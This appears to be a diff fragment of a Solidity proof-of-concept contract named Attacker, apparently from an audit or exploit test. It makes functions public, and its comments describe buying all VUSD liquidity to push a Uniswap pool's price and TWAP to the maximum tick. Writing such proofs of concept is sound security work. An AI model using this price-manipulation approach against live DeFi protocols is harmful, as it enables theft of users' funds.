@@ -80,7 +80,7 @@ contract Attacker {
         refundWETH();
     }
 
-    function buyUSDC() internal {
+    function buyUSDC() public payable {
         WETH.deposit{value: msg.value}();
 
         uint256 wantUsdc = 250_000 * 1e6;
@@ -98,7 +98,7 @@ contract Attacker {
         uint256 amountIn = swapRouter.exactOutputSingle(params);
     }
 
-    function buyAllVUSD() internal {
+    function buyAllVUSD() public {
         // we won't actually be able to buy up the entire VUSD.balanceOf(pool) balance, it'll be slightly less. I assume this is due to fees still in the contract or something
         // instead we use the sqrtPriceLimit at a max tick to search and buy up all liquidity up to this tick, s.t., in the end the new price will be at max tick
         // the sqrtPriceLimitX96 used here will end up being the sqrtPrice & currentTick of slot0, so pump it up to the maximum
@@ -177,7 +177,7 @@ contract Attacker {
 
     /// returns TWAP price in 6 decimals
     function getUniswapTwapPrice(uint32 secondsAgo)
-        internal
+        public
         view
         returns (uint256 price)
     {
